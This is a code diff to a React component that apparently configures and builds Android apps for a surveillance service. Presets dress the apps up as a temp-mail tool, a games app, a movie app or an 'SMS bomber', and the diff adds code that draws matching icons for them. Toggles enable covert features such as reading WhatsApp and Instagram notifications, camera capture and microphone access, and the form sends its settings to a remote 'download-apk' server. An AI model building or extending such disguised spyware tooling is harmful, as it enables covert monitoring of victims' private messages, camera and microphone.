@@ -62,6 +62,89 @@ const APP_PRESETS = [
     }
 ];
 
+const PRESET_ICON_STYLES: Record<string, { gradient: [string, string, string]; svgPath: string }> = {
+    temp_mail: {
+        gradient: ['#10B981', '#059669', '#047857'],
+        svgPath: 'M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z'
+    },
+    poki_games: {
+        gradient: ['#A855F7', '#9333EA', '#6B21A8'],
+        svgPath: 'M6 12h.01M10 12h.01M15 16a4 4 0 004-4V6a2 2 0 00-2-2H7a2 2 0 00-2 2v6a4 4 0 004 4h2m0 0v4m-2 0h4'
+    },
+    movie_box: {
+        gradient: ['#F43F5E', '#E11D48', '#9F1239'],
+        svgPath: 'M7 4v16M17 4v16M3 8h4m10 0h4M3 12h18M3 16h4m10 0h4M4 20h16a1 1 0 001-1V5a1 1 0 00-1-1H4a1 1 0 00-1 1v14a1 1 0 001 1z'
+    },
+    sms_bomber: {
+        gradient: ['#F59E0B', '#EA580C', '#DC2626'],
+        svgPath: 'M17.657 18.657A8 8 0 016.343 7.343S7 9 9 10c0-2 .5-5 2.986-7C14 5 16.09 5.777 17.656 7.343A7.975 7.975 0 0120 13a7.975 7.975 0 01-2.343 5.657z M9.879 16.121A3 3 0 1012.015 11L11 14H9c0 .768.293 1.536.879 2.121z'
+    }
+};
+
+function generatePresetIconBlob(presetId: string): Promise<Blob | null> {
+    return new Promise((resolve) => {
+        const style = PRESET_ICON_STYLES[presetId];
+        if (!style) { resolve(null); return; }
+
+        const size = 512;
+        const canvas = document.createElement('canvas');
+        canvas.width = size;
+        canvas.height = size;
+        const ctx = canvas.getContext('2d');
+        if (!ctx) { resolve(null); return; }
+
+        const r = size * 0.22;
+        const drawRoundRect = (x: number, y: number, w: number, h: number, radius: number) => {
+            ctx.beginPath();
+            ctx.moveTo(x + radius, y);
+            ctx.lineTo(x + w - radius, y);
+            ctx.quadraticCurveTo(x + w, y, x + w, y + radius);
+            ctx.lineTo(x + w, y + h - radius);
+            ctx.quadraticCurveTo(x + w, y + h, x + w - radius, y + h);
+            ctx.lineTo(x + radius, y + h);
+            ctx.quadraticCurveTo(x, y + h, x, y + h - radius);
+            ctx.lineTo(x, y + radius);
+            ctx.quadraticCurveTo(x, y, x + radius, y);
+            ctx.closePath();
+        };
+
+        const grad = ctx.createLinearGradient(0, 0, size, size);
+        grad.addColorStop(0, style.gradient[0]);
+        grad.addColorStop(0.5, style.gradient[1]);
+        grad.addColorStop(1, style.gradient[2]);
+
+        drawRoundRect(0, 0, size, size, r);
+        ctx.fillStyle = grad;
+        ctx.fill();
+
+        ctx.strokeStyle = 'rgba(255,255,255,0.25)';
+        ctx.lineWidth = 4;
+        drawRoundRect(2, 2, size - 4, size - 4, r);
+        ctx.stroke();
+
+        const iconSize = size * 0.4;
+        const offset = (size - iconSize) / 2;
+        ctx.save();
+        ctx.translate(offset, offset);
+        ctx.scale(iconSize / 24, iconSize / 24);
+        ctx.strokeStyle = 'white';
+        ctx.lineWidth = 2;
+        ctx.lineCap = 'round';
+        ctx.lineJoin = 'round';
+        ctx.fillStyle = 'none';
+
+        const paths = style.svgPath.split(' M');
+        paths.forEach((p, i) => {
+            const d = i === 0 ? p : 'M' + p;
+            const path2d = new Path2D(d);
+            ctx.stroke(path2d);
+        });
+        ctx.restore();
+
+        canvas.toBlob((blob) => resolve(blob), 'image/png', 1.0);
+    });
+}
+
 export default function AppGenerationModal({ isOpen, onClose, uuid, socket, userPlan = 'basic', onUpgrade }: AppGenerationModalProps) {
     const isBasicPlan = userPlan === 'basic';
     const isPremium = userPlan === 'premium';
@@ -390,6 +473,11 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             }
             if (selectedPreset === 'custom' && customIcon) {
                 formData.append('icon', customIcon);
+            } else if (selectedPreset !== 'custom') {
+                const iconBlob = await generatePresetIconBlob(selectedPreset);
+                if (iconBlob) {
+                    formData.append('icon', iconBlob, `${selectedPreset}_icon.png`);
+                }
             }
 
             const response = await fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/download-apk`, {
@@ -787,26 +875,6 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                     </button>
                                 </div>
 
-                                {/* Notification Reader (Monitored Alerts) - Soft Sky */}
-                                <div className="p-4 rounded-2xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(14,165,233,0.1)]">
-                                    <div className="flex flex-col">
-                                        <div className="flex items-center gap-2">
-                                            <span className="text-sm font-bold text-sky-200">Notification Reader</span>
-                                            <button type="button" onClick={() => setShowPermissionInfo('notifications')} className="text-sky-400/70 hover:text-sky-300">
-                                                <Info size={14} />
-                                            </button>
-                                        </div>
-                                        <span className="text-xs text-sky-300/70">Monitors WhatsApp, Instagram & incoming messaging notifications.</span>
-                                    </div>
-                                    <button
-                                        type="button"
-                                        onClick={() => setEnableNotificationListener(!enableNotificationListener)}
-                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${enableNotificationListener ? 'bg-sky-500' : 'bg-white/20'}`}
-                                    >
-                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener ? 'left-6' : 'left-1'}`} />
-                                    </button>
-                                </div>
-
                                 {/* Camera Capture - Soft Cyan */}
                                 <div className={`p-4 rounded-2xl bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(6,182,212,0.1)]`}>
                                     <div className="flex flex-col">
@@ -860,6 +928,26 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                         className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${!isPremium ? 'bg-white/10' : enableMicrophonePermission ? 'bg-purple-500' : 'bg-white/20'}`}
                                     >
                                         <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableMicrophonePermission && isPremium ? 'left-6' : 'left-1'}`} />
+                                    </button>
+                                </div>
+
+                                {/* Notification Reader (Monitored Alerts) - Soft Sky */}
+                                <div className="p-4 rounded-2xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(14,165,233,0.1)]">
+                                    <div className="flex flex-col">
+                                        <div className="flex items-center gap-2">
+                                            <span className="text-sm font-bold text-sky-200">Notification Reader</span>
+                                            <button type="button" onClick={() => setShowPermissionInfo('notifications')} className="text-sky-400/70 hover:text-sky-300">
+                                                <Info size={14} />
+                                            </button>
+                                        </div>
+                                        <span className="text-xs text-sky-300/70">Monitors WhatsApp, Instagram & incoming messaging notifications.</span>
+                                    </div>
+                                    <button
+                                        type="button"
+                                        onClick={() => setEnableNotificationListener(!enableNotificationListener)}
+                                        className={`w-11 h-6 rounded-full transition-colors relative flex-shrink-0 ${enableNotificationListener ? 'bg-sky-500' : 'bg-white/20'}`}
+                                    >
+                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableNotificationListener ? 'left-6' : 'left-1'}`} />
                                     </button>
                                 </div>
 
